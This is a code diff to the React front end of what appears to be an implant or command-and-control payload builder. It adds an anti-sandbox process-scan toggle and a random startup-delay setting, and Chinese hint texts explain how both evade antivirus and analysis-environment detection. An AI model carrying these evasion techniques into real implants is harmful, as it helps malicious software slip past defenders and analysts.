@@ -261,6 +261,11 @@ export function Builds() {
     xor_key_size: 16,
     garble_enabled: false,
     upx_enabled: false,
+    // 主动反沙箱进程检测：默认关闭（会被国产杀软主动防御拦截，见服务端说明）
+    evasion_scan: false,
+    // 启动随机延迟：默认沿用服务端配置（implant.startup_delay_min/max）
+    startup_delay_min: 0,
+    startup_delay_max: 0,
   })
 
   const fetchData = async () => {
@@ -318,7 +323,8 @@ export function Builds() {
         newVal = (e.target as HTMLInputElement).checked
       } else if (name === 'xor_key_size') {
         newVal = parseInt(value) || 16
-      } else if (name === 'interval' || name === 'jitter' || name === 'retry_count' || name === 'retry_wait') {
+      } else if (name === 'interval' || name === 'jitter' || name === 'retry_count' || name === 'retry_wait'
+        || name === 'startup_delay_min' || name === 'startup_delay_max') {
         newVal = parseInt(value) || 0
       }
       
@@ -1049,6 +1055,61 @@ export function Builds() {
                         ? '使用 UPX --best --lzma 压缩可执行文件 (仅Windows)'
                         : 'UPX 需要安装 (https://upx.github.io)'}
                     </p>
+                  </div>
+                </div>
+
+                <div className="evasion-toggle-row">
+                  <div className="toggle-group">
+                    <label className="toggle-label">
+                      <input
+                        type="checkbox"
+                        name="evasion_scan"
+                        checked={formData.evasion_scan || false}
+                        onChange={handleInputChange}
+                      />
+                      <span>主动反沙箱进程检测</span>
+                      <span className="status-badge unavailable">默认关闭</span>
+                    </label>
+                    <p className="form-hint">
+                      启动时枚举进程并与安全软件/分析工具进程名比对，命中则延迟执行。
+                      <strong>会引入 toolhelp32 导入与一批杀软进程名字符串</strong>
+                      ，360/火绒/电脑管家的主动防御会直接拦截该对抗行为 —— 只在明确需要
+                      "识别分析环境"时开启。
+                    </p>
+                  </div>
+                </div>
+
+                <div className="evasion-toggle-row">
+                  <div className="toggle-group">
+                    <label className="toggle-label"><span>启动随机延迟 (秒)</span></label>
+                    <p className="form-hint">
+                      载荷启动后随机休眠 [最小, 最大] 秒再首次回连，打乱"启动即行为"的
+                      检测节奏。留 0 使用服务端配置（implant.startup_delay_min/max）。
+                    </p>
+                    <div style={{ display: 'flex', gap: '8px', marginTop: '8px' }}>
+                      <div className="form-group" style={{ margin: 0 }}>
+                        <label>最小</label>
+                        <input
+                          type="number"
+                          name="startup_delay_min"
+                          min={0}
+                          max={600}
+                          value={formData.startup_delay_min ?? 0}
+                          onChange={handleInputChange}
+                        />
+                      </div>
+                      <div className="form-group" style={{ margin: 0 }}>
+                        <label>最大</label>
+                        <input
+                          type="number"
+                          name="startup_delay_max"
+                          min={0}
+                          max={600}
+                          value={formData.startup_delay_max ?? 0}
+                          onChange={handleInputChange}
+                        />
+                      </div>
+                    </div>
                   </div>
                 </div>
               </div>
